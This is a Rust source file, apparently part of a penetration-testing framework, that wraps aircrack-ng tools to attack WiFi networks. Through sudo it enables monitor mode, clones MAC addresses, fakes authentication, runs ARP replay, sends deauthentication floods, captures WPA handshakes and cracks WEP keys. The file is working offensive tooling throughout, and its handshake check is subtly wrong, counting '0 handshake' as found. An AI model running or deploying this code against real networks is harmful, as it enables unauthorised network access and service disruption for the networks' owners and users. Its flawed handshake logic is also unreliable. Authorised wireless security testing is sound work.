//! WiFi attack operations for desktop Linux (aircrack-ng suite)

use crate::traits::*;
use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

use super::DesktopPlatform;

#[async_trait]
impl WifiAttackOps for DesktopPlatform {
    async fn enable_monitor_mode(&self, interface: &str) -> Result<String> {
        tracing::info!("Enabling monitor mode on {}", interface);

        // Kill interfering processes
        tracing::info!("Stopping interfering processes...");
        let _ = Command::new("sudo")
            .args(["airmon-ng", "check", "kill"])
            .output()
            .await;

        // Start monitor mode
        let output = Command::new("sudo")
            .args(["airmon-ng", "start", interface])
            .output()
            .await
            .map_err(|e| {
                Error::ToolExecution(format!(
                    "Failed to run airmon-ng (is it installed?): {}",
                    e
                ))
            })?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::ToolExecution(format!(
                "airmon-ng failed: {}",
                stderr
            )));
        }

        // Parse output to get monitor interface name
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Look for pattern like "mon0 mode enabled" or "wlan0mon enabled"
        let mon_interface = if let Some(line) = stdout.lines().find(|l| l.contains("monitor mode") && l.contains("enabled")) {
            // Try to extract interface name from line
            if let Some(word) = line.split_whitespace().next() {
                if word.contains("mon") {
                    word.to_string()
                } else {
                    format!("{}mon", interface)
                }
            } else {
                format!("{}mon", interface)
            }
        } else {
            // Fallback: assume standard naming
            format!("{}mon", interface)
        };

        tracing::info!("Monitor mode enabled: {}", mon_interface);
        Ok(mon_interface)
    }

    async fn disable_monitor_mode(&self, interface: &str) -> Result<()> {
        tracing::info!("Disabling monitor mode on {}", interface);

        // Remove "mon" suffix if present to get original interface
        let base_interface = interface.trim_end_matches("mon");

        let output = Command::new("sudo")
            .args(["airmon-ng", "stop", interface])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to stop monitor mode: {}", e)))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            tracing::warn!("Failed to disable monitor mode: {}", stderr);
        }

        // Restart NetworkManager if it was killed
        let _ = Command::new("sudo")
            .args(["systemctl", "start", "NetworkManager"])
            .output()
            .await;

        tracing::info!("Monitor mode disabled, NetworkManager restarted");
        Ok(())
    }

    async fn clone_mac(&self, interface: &str, target_mac: &str) -> Result<()> {
        tracing::info!("Cloning MAC address on {} to {}", interface, target_mac);

        // Bring interface down
        Command::new("sudo")
            .args(["ip", "link", "set", interface, "down"])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to bring interface down: {}", e)))?;

        // Change MAC
        let output = Command::new("sudo")
            .args(["macchanger", "-m", target_mac, interface])
            .output()
            .await
            .map_err(|e| {
                Error::ToolExecution(format!("Failed to run macchanger (is it installed?): {}", e))
            })?;

        // Bring interface back up
        Command::new("sudo")
            .args(["ip", "link", "set", interface, "up"])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to bring interface up: {}", e)))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::ToolExecution(format!(
                "macchanger failed: {}",
                stderr
            )));
        }

        tracing::info!("MAC address cloned successfully");
        Ok(())
    }

    async fn test_injection(&self, interface: &str) -> Result<InjectionCapability> {
        tracing::info!("Testing packet injection on {}", interface);

        let output = Command::new("sudo")
            .args(["aireplay-ng", "--test", interface])
            .output()
            .await
            .map_err(|e| {
                Error::ToolExecution(format!(
                    "Failed to run aireplay-ng (is it installed?): {}",
                    e
                ))
            })?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse injection test results
        // Look for lines like "30/30: 100%"
        let mut supported = false;
        let mut success_rate = 0.0;

        for line in stdout.lines() {
            if line.contains("/") && line.contains("%") {
                supported = true;
                // Try to extract percentage
                if let Some(pct_str) = line.split('%').next().and_then(|s| s.split_whitespace().last()) {
                    if let Ok(pct) = pct_str.parse::<f32>() {
                        success_rate = pct / 100.0;
                    }
                }
                break;
            }
        }

        if success_rate > 0.0 {
            tracing::info!("Injection test: {:.0}% success rate", success_rate * 100.0);
        } else {
            tracing::warn!("Injection test failed or not supported");
        }

        Ok(InjectionCapability {
            supported,
            success_rate,
        })
    }

    async fn start_capture(
        &self,
        interface: &str,
        bssid: &str,
        channel: u8,
        output_file: &str,
    ) -> Result<WifiCaptureHandle> {
        tracing::info!(
            "Starting packet capture on {} for BSSID {} (channel {})",
            interface,
            bssid,
            channel
        );

        // Start airodump-ng in background
        let child = Command::new("sudo")
            .args([
                "airodump-ng",
                "--bssid",
                bssid,
                "--channel",
                &channel.to_string(),
                "-w",
                output_file,
                "--output-format",
                "pcap",
                interface,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|e| {
                Error::ToolExecution(format!(
                    "Failed to start airodump-ng (is it installed?): {}",
                    e
                ))
            })?;

        let pid = child
            .id()
            .ok_or_else(|| Error::ToolExecution("Failed to get airodump-ng PID".into()))?;

        tracing::info!("Packet capture started (PID: {})", pid);

        Ok(WifiCaptureHandle {
            pid,
            output_file: output_file.to_string(),
            interface: interface.to_string(),
        })
    }

    async fn stop_capture(&self, handle: WifiCaptureHandle) -> Result<()> {
        tracing::info!("Stopping packet capture (PID: {})", handle.pid);

        // Send SIGTERM to airodump-ng process
        let _ = Command::new("sudo")
            .args(["kill", &handle.pid.to_string()])
            .output()
            .await;

        // Give it a moment to flush buffers
        tokio::time::sleep(Duration::from_millis(500)).await;

        tracing::info!("Packet capture stopped");
        Ok(())
    }

    async fn get_capture_stats(&self, handle: &WifiCaptureHandle) -> Result<WifiCaptureStats> {
        // Check if the capture file exists and has content
        let cap_file = format!("{}-01.cap", handle.output_file);

        // Use aircrack-ng to analyze the capture
        let output = Command::new("aircrack-ng")
            .arg(&cap_file)
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to analyze capture: {}", e)))?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Parse stats from output
        let mut ivs = 0;
        let mut has_handshake = false;

        for line in stdout.lines() {
            // Look for "#Data" count (IVs for WEP)
            if line.contains("#Data") {
                if let Some(data_str) = line.split_whitespace().nth(1) {
                    ivs = data_str.parse().unwrap_or(0);
                }
            }

            // Look for handshake indicator
            if line.contains("handshake") || line.contains("1 handshake") {
                has_handshake = true;
            }
        }

        Ok(WifiCaptureStats {
            packets: ivs as u64, // Approximate
            ivs,
            has_handshake,
            data_packets: ivs as u64,
        })
    }

    async fn fake_auth(&self, interface: &str, bssid: &str) -> Result<()> {
        tracing::info!("Performing fake authentication to {}", bssid);

        let output = Command::new("sudo")
            .args([
                "aireplay-ng",
                "--fakeauth",
                "0",
                "-a",
                bssid,
                interface,
            ])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to run fake auth: {}", e)))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(Error::ToolExecution(format!(
                "Fake authentication failed: {}",
                stderr
            )));
        }

        tracing::info!("Fake authentication successful");
        Ok(())
    }

    async fn start_arp_replay(&self, interface: &str, bssid: &str) -> Result<ArpReplayHandle> {
        tracing::info!("Starting ARP replay attack on {}", bssid);

        let child = Command::new("sudo")
            .args([
                "aireplay-ng",
                "--arpreplay",
                "-b",
                bssid,
                interface,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|e| Error::ToolExecution(format!("Failed to start ARP replay: {}", e)))?;

        let pid = child
            .id()
            .ok_or_else(|| Error::ToolExecution("Failed to get aireplay-ng PID".into()))?;

        tracing::info!("ARP replay attack started (PID: {})", pid);

        Ok(ArpReplayHandle { pid })
    }

    async fn stop_arp_replay(&self, handle: ArpReplayHandle) -> Result<()> {
        tracing::info!("Stopping ARP replay attack (PID: {})", handle.pid);

        let _ = Command::new("sudo")
            .args(["kill", &handle.pid.to_string()])
            .output()
            .await;

        tracing::info!("ARP replay stopped");
        Ok(())
    }

    async fn deauth_attack(
        &self,
        interface: &str,
        bssid: &str,
        client: Option<&str>,
        count: u8,
    ) -> Result<()> {
        let target = client.unwrap_or("broadcast");
        tracing::info!(
            "Sending {} deauth packets to {} on {}",
            count,
            target,
            bssid
        );

        let count_str = count.to_string();
        let mut args = vec![
            "aireplay-ng",
            "--deauth",
            &count_str,
            "-a",
            bssid,
        ];

        let client_arg;
        if let Some(c) = client {
            client_arg = c.to_string();
            args.push("-c");
            args.push(&client_arg);
        }

        args.push(interface);

        let output = Command::new("sudo")
            .args(&args)
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to run deauth attack: {}", e)))?;

        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            tracing::warn!("Deauth attack may have failed: {}", stderr);
        }

        tracing::info!("Deauth packets sent");
        Ok(())
    }

    async fn verify_handshake(&self, capture_file: &str, bssid: &str) -> Result<bool> {
        tracing::info!("Verifying handshake in {}", capture_file);

        let cap_file = format!("{}-01.cap", capture_file);

        let output = Command::new("aircrack-ng")
            .args(["-b", bssid, &cap_file])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to verify handshake: {}", e)))?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Look for "1 handshake" in output
        let has_handshake = stdout.contains("1 handshake") || stdout.contains("handshake");

        if has_handshake {
            tracing::info!("✓ Valid handshake found");
        } else {
            tracing::warn!("✗ No valid handshake found");
        }

        Ok(has_handshake)
    }

    async fn crack_wep(&self, capture_file: &str, bssid: &str) -> Result<Option<String>> {
        tracing::info!("Cracking WEP key from {}", capture_file);

        let cap_file = format!("{}-01.cap", capture_file);

        let output = Command::new("aircrack-ng")
            .args(["-b", bssid, &cap_file])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("Failed to crack WEP: {}", e)))?;

        let stdout = String::from_utf8_lossy(&output.stdout);

        // Look for "KEY FOUND!" line
        for line in stdout.lines() {
            if line.contains("KEY FOUND!") {
                // Extract key from line like "KEY FOUND! [ AB:CD:EF:12:34 ]"
                if let Some(key_part) = line.split('[').nth(1) {
                    if let Some(key) = key_part.split(']').next() {
                        let key = key.trim().to_string();
                        tracing::info!("✓ WEP key found: {}", key);
                        return Ok(Some(key));
                    }
                }
            }
        }

        tracing::warn!("✗ WEP key not found yet");
        Ok(None)
    }
}
